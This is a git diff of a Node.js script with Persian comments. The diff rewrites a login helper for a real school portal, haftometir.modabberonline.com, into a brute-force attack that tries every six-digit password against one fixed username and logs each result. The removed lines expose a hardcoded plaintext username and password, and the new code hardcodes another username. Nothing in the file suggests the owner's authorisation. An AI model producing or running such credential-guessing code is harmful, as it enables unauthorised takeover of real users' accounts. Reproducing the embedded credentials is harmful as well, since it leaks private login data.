@@ -3,32 +3,32 @@ const axios = require("axios");
 const cheerio = require("cheerio");
 const { wrapper } = require("axios-cookiejar-support");
 const { CookieJar } = require("tough-cookie");
+const fs = require("fs");
 
-// Login credentials
-const USERNAME = "020121971";
-const PASSWORD = "132375";
+// ⚙️ تنظیمات
+const USERNAME = "0111062640"; // 👈 یوزرنیم ثابت
 const LOGIN_URL =
-  "https://haftometir.modabberonline.com/Login.aspx?ReturnUrl=%2f&AspxAutoDetectCookieSupport=1";
+  "https://haftometir.modabberonline.com/Login.aspx?ReturnUrl=%2f&AspxAutoDetectCookieSupport=1"; // 👈 URL خودت
 
-// Function to login to Modabber system
-async function loginToModabber() {
-  console.log("🔄 Logging in to Modabber system...");
-  console.log(`👤 Username: ${USERNAME}`);
-  console.log(`🔑 Password: ${PASSWORD}`);
+const START = 0;
+const END = 999999;
+const DELAY = 1000; // میلی‌ثانیه تاخیر
 
+const logFile = "results.txt";
+
+// تابع تاخیر
+const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+
+// تابع لاگین
+async function tryLogin(username, password) {
   const jar = new CookieJar();
-  const client = wrapper(axios.create({ jar }));
+  const client = wrapper(axios.create({ jar, timeout: 10000 }));
 
   try {
-    // Step 1: Get login page to extract hidden fields
-    console.log("📄 Fetching login page...");
     const loginPageResponse = await client.get(LOGIN_URL);
     const $ = cheerio.load(loginPageResponse.data);
 
-    // Step 2: Prepare form data
     const formData = new URLSearchParams();
-
-    // Extract hidden fields
     $('input[type="hidden"]').each((i, elem) => {
       const name = $(elem).attr("name");
       const value = $(elem).attr("value");
@@ -37,14 +37,10 @@ async function loginToModabber() {
       }
     });
 
-    // Add credentials
-    formData.append("txtUserName", USERNAME);
-    formData.append("txtPassword", PASSWORD);
+    formData.append("txtUserName", username);
+    formData.append("txtPassword", password);
     formData.append("LoginButton", "ورود به سیستم");
 
-    console.log("📤 Sending login credentials...");
-
-    // Step 3: Submit login form
     const loginResponse = await client.post(LOGIN_URL, formData, {
       headers: {
         "Content-Type": "application/x-www-form-urlencoded",
@@ -56,81 +52,99 @@ async function loginToModabber() {
       validateStatus: (status) => status >= 200 && status < 400,
     });
 
-    console.log(`📊 HTTP Status: ${loginResponse.status}`);
-
-    // Check if login was successful
     const $response = cheerio.load(loginResponse.data);
-
-    // Check for error messages
     const errorMessage = $response("#lblMessage").text().trim();
     const loginError = $response(".error-message").text().trim();
-    const validationError = $response(".validation-summary-errors")
-      .text()
-      .trim();
 
-    if (errorMessage || loginError || validationError) {
-      console.error("❌ Login failed!");
-      console.error(
-        "📝 Error message:",
-        errorMessage ||
-          loginError ||
-          validationError ||
-          "Invalid username or password"
-      );
-      return false;
-    }
-
-    // If redirected (302), login was successful
     if (loginResponse.status === 302 || loginResponse.status === 301) {
-      const redirectUrl = loginResponse.headers.location;
-      console.log("✅ Login successful!");
-      console.log(`🔗 Redirected to: ${redirectUrl}`);
-
-      // Get cookies
-      const cookies = jar.getCookiesSync(LOGIN_URL);
-      console.log(`🍪 Cookies received: ${cookies.length}`);
-      cookies.forEach((cookie) => {
-        console.log(
-          `   - $${cookie.key}: $${cookie.value.substring(0, 20)}...`
-        );
-      });
-
-      return true;
+      return { success: true, message: "✅ SUCCESS - Redirected" };
     }
 
-    // If still on login page, login failed
     if ($response('input[name="txtUserName"]').length > 0) {
-      console.error("❌ Login failed!");
-      console.error(
-        "📝 Reason: Still on login page - probably wrong username or password"
-      );
-      return false;
+      return {
+        success: false,
+        message: errorMessage || loginError || "Invalid credentials",
+      };
     }
 
-    // If redirected to another page
-    console.log("✅ Login successful!");
-    return true;
+    return { success: true, message: "✅ SUCCESS - Logged in" };
   } catch (error) {
     if (error.response && error.response.status === 302) {
-      // Redirect means success
-      console.log("✅ Login successful! (Redirect detected)");
-      return true;
+      return { success: true, message: "✅ SUCCESS - Redirect detected" };
     }
 
-    console.error("❌ Error during login process:");
-    console.error("📝 Error message:", error.message);
-    if (error.response) {
-      console.error("📊 HTTP Status:", error.response.status);
+    if (error.code === "ECONNABORTED" || error.message.includes("timeout")) {
+      return { success: false, message: "⏱️ TIMEOUT" };
     }
-    return false;
+
+    if (error.response && error.response.status === 429) {
+      return { success: false, message: "🔒 LOCKED - Rate limited" };
+    }
+
+    return {
+      success: false,
+      message: `❌ ERROR - ${error.message}`,
+    };
   }
 }
 
-// Run login
-loginToModabber().then((success) => {
-  if (success) {
-    console.log("\n🎉 Login process completed successfully");
-  } else {
-    console.log("\n⚠️ Login process failed");
+// حلقه اصلی
+async function bruteForce() {
+  console.log("🚀 Starting password brute force test...");
+  console.log(`👤 Username: ${USERNAME} (ثابت)`);
+  console.log(
+    `🔑 Password range: ${START.toString().padStart(
+      6,
+      "0"
+    )} to ${END.toString().padStart(6, "0")}`
+  );
+  console.log(`⏱️ Delay: ${DELAY}ms between requests\n`);
+
+  fs.writeFileSync(
+    logFile,
+    `Password Brute Force Test\nUsername: ${USERNAME}\nStarted: ${new Date().toISOString()}\n\n`
+  );
+
+  let successCount = 0;
+  let failedCount = 0;
+
+  for (let i = START; i <= END; i++) {
+    const password = i.toString().padStart(6, "0"); // 👈 پسورد 6 رقمی متغیر
+
+    console.log(`[${i}/${END}] Testing password: ${password}`);
+
+    const result = await tryLogin(USERNAME, password);
+
+    if (result.success) {
+      successCount++;
+      console.log(`✅ PASSWORD FOUND: ${password} - ${result.message}`);
+      fs.appendFileSync(
+        logFile,
+        `✅ SUCCESS - Password: ${password} - ${result.message}\n`
+      );
+    } else {
+      failedCount++;
+      console.log(`❌ ${password} - FAILED - ${result.message}`);
+      fs.appendFileSync(
+        logFile,
+        `❌ ${password} - FAILED - ${result.message}\n`
+      );
+    }
+
+    if (i < END) await sleep(DELAY);
   }
-});
+
+  console.log("\n✅ Test Completed!");
+  console.log(`📊 Total tested: ${END - START + 1}`);
+  console.log(`✅ Success: ${successCount}`);
+  console.log(`❌ Failed: ${failedCount}`);
+
+  fs.appendFileSync(
+    logFile,
+    `\n--- Summary ---\nTotal: ${
+      END - START + 1
+    }\nSuccess: ${successCount}\nFailed: ${failedCount}\n`
+  );
+}
+
+bruteForce().catch(console.error);
